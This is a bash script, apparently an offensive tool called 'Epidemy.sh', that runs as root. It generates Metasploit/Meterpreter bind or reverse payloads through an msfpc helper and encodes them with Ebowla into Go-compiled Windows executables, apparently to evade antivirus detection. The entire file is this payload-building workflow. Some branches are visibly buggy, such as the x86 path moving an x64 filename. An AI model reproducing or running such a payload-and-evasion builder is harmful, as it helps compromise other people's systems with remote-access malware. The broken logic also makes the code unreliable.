#!/bin/bash
# Script written by rl1k 
# https://github.com/iNoSec


##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success/Asking for Input
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

help_banner=$(echo -e "${YELLOW}Usage : sudo ./Epidemy.sh${RESET}")

if [ $(id -u) != "0" ]; then
    echo -e "${YELLOW}[x]${RESET}  we need to be root to run this script..."
    echo -e "${YELLOW}[x]${RESET}  [ $help_banner ] on terminal"
    exit
else
    :   
fi


function doHelp {
  echo -e "\n ${BLUE}${0}${RESET} <${BOLD}TYPE${RESET}> (<${BOLD}DOMAIN/IP${RESET}>) (<${BOLD}PORT${RESET}>) (<${BOLD}CMD/MSF${RESET}>) (<${BOLD}BIND/REVERSE${RESET}>) (<${BOLD}STAGED/STAGELESS${RESET}>) (<${BOLD}TCP/HTTP/HTTPS/FIND_PORT${RESET}>) (<${BOLD}BATCH/LOOP${RESET}>) (<${BOLD}VERBOSE${RESET}>)"
    echo -e "   Example: ${BLUE} windows 192.168.1.10${RESET}        # Windows & manual IP."
    echo -e "            ${BLUE} elf bind eth0 4444${RESET}          # Linux, eth0's IP & manual port."
    echo -e "            ${BLUE} stageless cmd py https${RESET}      # Python, stageless command prompt."
    echo -e "            ${BLUE} verbose loop eth1${RESET}           # A payload for every type, using eth1's IP."
    echo -e "            ${BLUE} msf batch wan${RESET}               # All possible Meterpreter payloads, using WAN IP."
    echo -e "            ${BLUE} help verbose${RESET}                # Help screen, with even more information."
}


if [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]];then
    echo $help_banner
    
elif [[ -z $1 ]]; then
    read -p "Do you want to create a metasploit payload [N/y] " msfchoice 
        if [[ "$msfchoice" ==  "Y" ]] || [[ "$msfchoice" == "y" ]]; then
            doHelp
            read -p "Enter your settings for the payload: " msfpc 
            read -p "Select the arch of your payload : [x86/x64] " arch
                if [[ $arch == x64 ]];then
                    include/msfpcx64 $msfpc
                elif [[ $arch == x86 ]];then    
                    include/msfpcx86 $msfpc
                else 
                    echo -e "You must choice an arch for your payload"
                fi

else
    read -p "Enter the path of your custom payload: " custom
fi

cd "include/Ebowla" 

if [[ -z $custom ]];then
read -p "Do you want to configure the genetic.config file ? [Y/n]: " genetic
    if [[ "$genetic" == "Y" || "$genetic" == "y" ]];then
        sudo vi genetic.config;
    else
        echo "Ok?! Let's jump it!!"
    fi
msfpayload=$(ls -lat ../../ | head -4 | tail -1 | awk '{print $9}')

# $3 is useless for the moment, i must implement the hidden or nohidden option for ebowla

        if [[ $arch == x64 && -z $3 ]]; then
            sudo ./ebowla.py ../../$msfpayload genetic.config;
            sudo ./build_x64_go.sh output/go_symmetric_$msfpayload.go encoded_msf_payload_x64.exe;
            sudo rm -rf ../../$msfpayload
            sudo mv ../../*.rc ../../output/
            sudo mv output/encoded_msf_payload_x64.exe ../../output/
            sudo rm -rf output/*.go
            echo "Job done! The encoded payload had been saved: output/encoded_msf_payload_x64.exe"
            exit 1;
        elif [[ $arch == x86 && -z $3 ]];then
            sudo ./ebowla.py ../../$msfpayload genetic.config;
            sudo ./build_x86_go.sh output/go_symmetric_$msfpayload.go encoded_msf_payload_x86.exe ;
            sudo rm -rf ../../$msfpayload
            sudo mv ../../*.rc ../../output/
            sudo mv output/encoded_msf_payload_x64.exe ../../output/
            sudo rm -rf output/*.go
            echo -e "Job done! The encoded payload had been saved: output/encoded_msf_payload_x86.exe"
            exit 1;
# Will code this choice later
#        elif [[ $arch == x64 && $3 == --nohidden ]]; then
#            sudo ./ebowla.py $filename1 genetic.config;
#            echo "--nohidden detected"
#            sudo ./build_x64_go.sh output/go_symmetric_$filename1.go $output_ebo $3;
#            echo "Job done! The encoded payload had been saved: include/Ebowla/output/$output_ebo"
#            exit 1;
#        elif [[ $arch == x86 && $3 == --nohidden ]];then
#            sudo ./ebowla.py $filename1 genetic.config;
#            echo "--nohidden detected"
#            sudo ./build_x86_go.sh output/go_symmetric_$filename1.go $output_ebo $3;
#            echo "Job done! The encoded payload had been saved: include/Ebowla/output/$output_ebo"
#            exit 1;
        else
            echo "Without the good choice we cant do the job!! Bye!!"
            exit 0;
        fi

else
read -p "Do you want to configure the genetic.config file ? [Y/n]: " genetic
    if [[ "$genetic" == "Y" || "$genetic" == "y" ]];then
        sudo vi genetic.config;
    else
        echo "Ok?! Let's jump it!!"
   fi

filename1=$(basename $custom)
read -p "Select the arch of your payload : [x86/x64] " arch    
output_ebo=encoded_payload_$arch.exe
        if [[ "$arch" == "x64" && -z "$hide" ]]; then
            sudo ./ebowla.py $custom genetic.config;
            sudo ./build_x64_go.sh output/go_symmetric_$filename1.go $output_ebo;
            sudo mv output/$output_ebo ../../output/
            sudo rm -rf output/*.go
            echo "Job done! The encoded payload had been saved: output/$output_ebo"
            exit 1;
        elif [[ $arch == x86 && -z $hide ]];then
            sudo ./ebowla.py $custom genetic.config;
            sudo ./build_x86_go.sh output/go_symmetric_$filename1.go $output_ebo;
            sudo mv output/$output_ebo ../../output/
            sudo rm -rf output/*.go
            echo "Job done! The encoded payload had been saved: include/Ebowla/output/$output_ebo"
            exit 1;
#        elif [[ "$arch" == "x64" ]] && [[ "$hide" == "--nohidden" ]]; then
#            sudo ./ebowla.py $filename1 genetic.config;
#            echo "--nohidden detected"
#            sudo ./build_x64_go.sh output/go_symmetric_$filename1.go $output_ebo $3;
#            echo "Job done! All have been saved under $ebowla/output directory"
#            exit 1;
#        elif [[ "$arch" == "x86" && "$hide" == "--nohidden" ]];then
#            sudo ./ebowla.py $filename1 genetic.config;
#            echo "--nohidden detected"
#            sudo ./build_x86_go.sh output/go_symmetric_$filename1.go $output_ebo $3;
#            echo "Job done! All have been saved under $ebowla/output directory"
#            exit 1;
        else
            echo "You must choice an arch!! Dont waste my time Sir!!"
            exit 0;
        fi
fi
fi
